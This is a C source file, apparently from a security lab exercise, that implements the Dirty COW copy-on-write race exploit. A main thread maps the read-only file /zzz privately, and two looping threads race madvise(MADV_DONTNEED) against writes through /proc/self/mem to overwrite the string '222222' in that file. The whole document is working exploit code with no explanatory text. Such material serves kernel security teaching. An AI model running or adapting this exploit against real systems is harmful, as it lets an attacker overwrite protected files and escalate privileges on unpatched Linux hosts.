/* cow_attack.c (the main thread) */
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <unistd.h>
void *map;

/* cow_attack.c (the write thread) */
void *writeThread(void *arg){
 char *content= "******";
 off_t offset = (off_t) arg;
 int f=open("/proc/self/mem", O_RDWR);
 while(1) {
 // Move the file pointer to the corresponding position.
 lseek(f, offset, SEEK_SET);
 // Write to the memory.
 write(f, content, strlen(content));
 }
}

/* cow_attack.c (the madvise thread) */
void *madviseThread(void *arg) {
 int file_size = (int) arg;

 while(1){
 madvise(map, file_size, MADV_DONTNEED);
 }
}


int main(int argc, char *argv[]) {
 pthread_t pth1,pth2;
 struct stat st;
 int file_size;
 // Open the target file in the read-only mode.
 int f=open("/zzz", O_RDONLY);

 // Map the file to COW memory using MAP_PRIVATE.
 fstat(f, &st);
 file_size = st.st_size;
 map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);

 // Find the position of the target area
 char *position = strstr(map, "222222");

 // We have to do the attack using two threads.
 pthread_create(&pth1, NULL, madviseThread, (void *)file_size);
 pthread_create(&pth2, NULL, writeThread, position);

 // Wait for the threads to finish.
 pthread_join(pth1, NULL);
 pthread_join(pth2, NULL);

 return 0;
}